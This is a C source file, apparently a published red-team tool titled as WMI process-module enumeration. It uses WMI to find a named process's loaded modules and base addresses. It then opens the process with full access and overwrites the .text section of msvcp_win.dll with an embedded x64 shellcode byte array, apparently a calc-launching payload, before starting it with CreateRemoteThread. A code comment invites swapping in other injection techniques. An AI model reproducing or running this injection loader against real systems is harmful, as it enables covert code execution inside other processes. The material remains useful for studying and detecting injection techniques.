/* 
Title : WMI to Enumerate a Process Modules and Their Base Addresses
@zux0x3a 

compile : x86_x64-w64-mingw32-gcc Program.c -o wmi.exe -lole32 -loleaut32 -lwebmuuid 
Article : https://0xsp.com/uncategorized/how-i-leveraged-wmi-to-enumerate-a-process-modules-and-their-base-addresses/

*/ 
	


#include <windows.h>
#include <wbemidl.h>
#include <stdio.h>
#include <stdint.h>


#define TEXT_SECTION_OFFSET 0x1000

#pragma comment(lib, "wbemuuid.lib")





void WriteShellcode(HANDLE hProcess, LPVOID addr, BYTE* buf, SIZE_T bufSize) {
    DWORD oldProtect;
    SIZE_T outSize;
    
    BOOL success = VirtualProtectEx(hProcess, addr, bufSize, 0x04, &oldProtect);
    if (!success) {
        DWORD error = GetLastError();
        printf("VirtualProtectEx failed with error %d\n", error);
        return;
    }
    
  
    success = WriteProcessMemory(hProcess, addr, buf, bufSize, &outSize);
    if (!success) {
        DWORD error = GetLastError();
        printf("WriteProcessMemory failed with error %d\n", error);
        return;
    }

    success = VirtualProtectEx(hProcess, addr, bufSize, oldProtect, &oldProtect);
    if (!success) {
        DWORD error = GetLastError();
        printf("VirtualProtectEx failed with error %d\n", error);
        return;
    }

        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, addr, NULL, 0, &hThread);
  if (hThread == NULL) {
        printf("Failed to create remote thread. Error code = %d\n", GetLastError());
       VirtualFreeEx(hProcess, addr, sizeof(buf), MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }


}

BSTR extractFilePath(BSTR input) {
   
    const wchar_t* wideInput = input;

    // Find the position of ".Name="
    wchar_t* namePos = wcsstr(wideInput, L".Name=\"");
    if (namePos != NULL) {
        // Move the pointer to the beginning of the file path
        wchar_t* start = namePos + wcslen(L".Name=\"");

        // Find the position of the closing double quote after the file path
        wchar_t* end = wcschr(start, '\"');

        if (end != NULL) {
            
            size_t length = end - start;
            BSTR result = SysAllocStringLen(start, length);
            return result;
        }
    }
    return NULL; 
}


void GetExecutables(const char* processName) {
    HRESULT hres;
    BSTR exePath;
    const char* procPath;
    char hexadecimal[13];




     unsigned char buf[] = { 
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
        };


    // Initialize COM
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) {
        printf("Failed to initialize COM library. Error code = 0x%x\n", hres);
        return;
    }

    // Initialize COM security
    hres = CoInitializeSecurity(
        NULL,
        -1,                          // COM authentication
        NULL,                        // Authentication services
        NULL,                        // Reserved
        RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication
        RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation
        NULL,                        // Authentication info
        EOAC_NONE,                   // Additional capabilities
        NULL                         // Reserved
    );

    if (FAILED(hres)) {
        printf("Failed to initialize security. Error code = 0x%x\n", hres);
        CoUninitialize();
        return;
    }

    // Connect to WMI
    IWbemLocator* pIWbemLoc = NULL;   
    hres = CoCreateInstance(
        &CLSID_WbemLocator,
        0,
        CLSCTX_INPROC_SERVER,
        &IID_IWbemLocator,
        (LPVOID*)&pIWbemLoc);

    if (FAILED(hres)) {
        printf("Failed to create IWbemLocator object. Error code = 0x%x\n", hres);
        CoUninitialize();
        return;
    }

    IWbemServices* pSvc = NULL;
    hres = pIWbemLoc->lpVtbl->ConnectServer(pIWbemLoc,
        SysAllocString(L"ROOT\\CIMV2"),
        NULL,
        NULL,
        0,
        NULL,
        0,
        0,
        &pSvc
    );

    if (FAILED(hres)) {
        printf("Could not connect. Error code = 0x%x\n", hres);
        pIWbemLoc->lpVtbl->Release(pIWbemLoc);
        CoUninitialize();
        return;
    }

    // Set security levels on the proxy
    hres = CoSetProxyBlanket(
        pSvc,
        RPC_C_AUTHN_WINNT,
        RPC_C_AUTHZ_NONE,
        NULL,
        RPC_C_AUTHN_LEVEL_CALL,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE
    );

    if (FAILED(hres)) {
        printf("Could not set proxy blanket. Error code = 0x%x\n", hres);
        pSvc->lpVtbl->Release(pSvc);
        pIWbemLoc->lpVtbl->Release(pIWbemLoc);
        CoUninitialize();
        return;
    }


    printf("[!] Target Process is : %s \n",processName);

    // Query for processes
     WCHAR query[512];
    swprintf(query,512,L"SELECT * FROM Win32_Process WHERE Name = '%s'", processName);
    
    IEnumWbemClassObject* pEnumerator = NULL;
    hres = pSvc->lpVtbl->ExecQuery(pSvc,
        SysAllocString(L"WQL"),
        SysAllocString(query),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        NULL,
        &pEnumerator
    );

    if (FAILED(hres)) {
        printf("[!]Query for processes failed. Error code = 0x%x\n", hres);
        pSvc->lpVtbl->Release(pSvc);
        pIWbemLoc->lpVtbl->Release(pIWbemLoc);
        CoUninitialize();
        return;
    }

    IWbemClassObject* pclsObj = NULL;
    ULONG uReturn = 0;

    while (pEnumerator) {
        hres = pEnumerator->lpVtbl->Next(pEnumerator,WBEM_INFINITE, 1, &pclsObj, &uReturn);

        if (0 == uReturn) {
            break;
        }

        VARIANT vtProp;

        // Get the process path
        hres = pclsObj->lpVtbl->Get(pclsObj,L"ProcessId", 0, &vtProp, 0, 0);
        if (SUCCEEDED(hres)) {
           // printf("Got the process id '%d'",vtProp.uintVal);
            WCHAR query[512];
            swprintf(query, 512, L"SELECT * FROM CIM_ProcessExecutable WHERE Dependent = \"\\\\\\\\.\\\\root\\\\cimv2:Win32_Process.Handle=%d\"", vtProp.uintVal);
            IEnumWbemClassObject* pExecEnumerator = NULL;
            hres = pSvc->lpVtbl->ExecQuery(pSvc,
                SysAllocString(L"WQL"),
                SysAllocString(query),
                WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                NULL,
                &pExecEnumerator
            );

           if (FAILED(hres)) {
       printf("[!]Query for CIM_ProcessExecutable failed. Error code = 0x%x\n", hres);
        pSvc->lpVtbl->Release(pSvc);
        pIWbemLoc->lpVtbl->Release(pIWbemLoc);
        CoUninitialize();
        return;
        }


            if (SUCCEEDED(hres)) {
               
                IWbemClassObject* pclsExecObj = NULL;
                ULONG uReturnExec = 0;

                // Retrieve executable instances
                while (pExecEnumerator) {
                    hres = pExecEnumerator->lpVtbl->Next(pExecEnumerator, WBEM_INFINITE, 1, &pclsExecObj, &uReturnExec);

                    if (0 == uReturnExec) {
                        break;
                    }

                    VARIANT vtExecProp;
                    VARIANT vtBaseAddre; 

                    hres = pclsExecObj->lpVtbl->Get(pclsExecObj, L"Antecedent", 0, &vtExecProp, NULL, NULL);
                    hres = pclsExecObj->lpVtbl->Get(pclsExecObj, L"BaseAddress", 0, &vtBaseAddre, NULL, NULL);

                     
                  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, vtProp.uintVal);
                 

                    if (hProcess == NULL) {
                    printf("Failed to open process with ID %d. Error code: %d\n", vtProp.uintVal, GetLastError());
                    continue;
                }


                    if (SUCCEEDED(hres)) {
                       int Dec_i;
                       exePath = vtExecProp.bstrVal;              
                        BSTR filePath = extractFilePath(exePath);
                        printf("[+]Module : %S\n", filePath);
                       
                       //   printf("[Loaded DLL %S\n]",exePath);
                  //  printf("BaseAddress: (SINT64) %S\n]",vtBaseAddre.bstrVal);  



                        Dec_i = wcstoll(vtBaseAddre.bstrVal,NULL,10); //Convert BSTR to INT
                        printf("[+]BaseAddress:  %X\n",Dec_i);
                        uintptr_t baseAddress = Dec_i;
                        uintptr_t adjustedAddress = (uintptr_t)0x7FFF00000000 | baseAddress;
                        LPVOID addr = (LPVOID)(adjustedAddress + TEXT_SECTION_OFFSET);
                         SIZE_T bufSize = sizeof(buf);
                    
                         const wchar_t* widePath = filePath;

                       if (wcsstr(widePath, L"msvcp_win.dll") != NULL ){
                         printf("[!] Injecting the Shellcode into this Module \n");
                        WriteShellcode(hProcess, addr,buf,bufSize); // you can use any injection technique would like to! 
                       }


                    }

                    VariantClear(&vtExecProp);
                    pclsExecObj->lpVtbl->Release(pclsExecObj);
                }

                pExecEnumerator->lpVtbl->Release(pExecEnumerator);
            }

            VariantClear(&vtProp);
        }

        pclsObj->lpVtbl->Release(pclsObj);
    }

    pEnumerator->lpVtbl->Release(pEnumerator);
    pSvc->lpVtbl->Release(pSvc);
    pIWbemLoc->lpVtbl->Release(pIWbemLoc);
    CoUninitialize();
}

int main(int argc, wchar_t *argv[]) {


    if (argc != 2 ){

        printf("Usage: %S <ProcessName>\n",argv[0]);
        return 1; 
    }
    
    printf(R"EOF(
    
    
 __          ____  __ _____   _____  _____   ____   _____ 
 \ \        / /  \/  |_   _| |  __ \|  __ \ / __ \ / ____|
  \ \  /\  / /| \  / | | |   | |__) | |__) | |  | | |     
   \ \/  \/ / | |\/| | | |   |  ___/|  _  /| |  | | |     
    \  /\  /  | |  | |_| |_  | |    | | \ \| |__| | |____ 
     \/  \/   |_|  |_|_____| |_|    |_|  \_\\____/ \_____|
                                                          
       by @zux0x3a                                                    

    
    )EOF");

    // Call the function with the desired process name
    GetExecutables(argv[1]);
     getchar();
    return 0;
}
